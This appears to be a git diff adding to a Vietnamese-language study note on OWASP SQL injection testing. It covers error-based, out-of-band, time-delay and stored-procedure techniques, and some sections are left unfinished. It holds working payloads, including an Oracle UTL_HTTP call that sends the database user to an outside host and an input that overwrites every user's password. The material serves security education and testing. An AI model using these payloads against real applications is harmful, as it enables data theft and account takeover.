@@ -75,7 +75,7 @@ SELECT * FROM users WHERE uname = 'admin' OR 1=1 # AND password='';
 
 ![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/005-9.png) 
 
-# Các kĩ thuật khai thác sql
+# Các kĩ thuật khai thác sql khác
 ## SQL boolean base
 - Boolean based: Cơ sở của kỹ thuật này là việc so sánh đúng sai để tìm ra từng ký tự của những thông tin như tên bảng, tên cột… Khi mà chúng ta không thể sử dụng kĩ thuật UNION BASE
 
@@ -141,5 +141,65 @@ SELECT * FROM users WHERE uname = 'admin' OR 1=1 # AND password='';
     ![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/005-25.png)
     ![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/005-26.png)
     ![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/005-27.png)
+## Error based
+- Đây là phương pháp truy xuất dữ liệu dựa trên thông báo lỗi trong truy vấn sql. Trong khi tạo ra các ứng dụng, lập trình viên đã sơ ý quên tắt các thông báo lỗi, khiến cho các hacker có thể dựa vào thông báo lỗi để truy vấn dữ liệu.
+VD:  
+```sql
+https://example.com/members?id=1+and(select 1 FROM(select count(*),concat((select (select concat(database()))
+FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x 
+FROM information_schema.tables GROUP BY x)a)
+```
+- Khi gửi request trên thì nó sẽ trả về một Error:
+```sql
+Duplicate entry 'user' for key 'group_key'
+```
+- Thông báo lỗi đã trả về tên database.
+VD2:
+```sql
+www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--
+```
+- Error
+```sql
+ORA-292257: host SCOTT unknown
+```
+# Out of band 
+- Kỹ thuật này bao gồm việc sử dụng các hàm **DBMS** để thực hiện kết nối ngoài và gửi kết quả của truy vấn đến máy chủ thử nghiệm.  
 
+VD:
 
+```sql
+www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--
+```
+
+- Dữ liệu được gửi đến server thử nghiệm:
+```
+GET /SCOTT HTTP/1.1
+Host: testerserver.com
+Connection: close
+```
+
+##  Time Delay 
+- Kĩ thuật này là một kỹ thuật SQL Injection suy diễn, dựa vào việc gửi một truy vấn SQL đến cơ sở dữ liệu, điều này buộc cơ sở dữ liệu phải chờ một khoảng thời gian xác định (tính bằng giây) trước khi trả lời. Thời gian phản hồi sẽ cho kẻ tấn công biết kết quả của truy vấn là TRUE hay FALSE. Tùy thuộc vào kết quả, phản hồi HTTP sẽ được trả về với độ trễ hoặc trả về ngay lập tức.
+
+VD:
+## Stored Procedure Injection
+- Kĩ thuật này có vẻ khó xảy và ít khi được sử dụng. Nguyên nhân xảy ra lỗi là do việc sử dụng SQL động.
+VD: SQL Server Stored Procedure:
+```sql
+Create
+procedure get_report @columnamelist varchar(7900)
+As
+Declare @sqlstring varchar(8000)
+Set @sqlstring  = ‘
+Select ‘ + @columnamelist + ‘ from ReportTable‘
+exec(@sqlstring)
+Go
+``` 
+User input:
+```sql
+1 from users; update users set password = 'password'; select *
+```
+# Continue
+
+# References
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
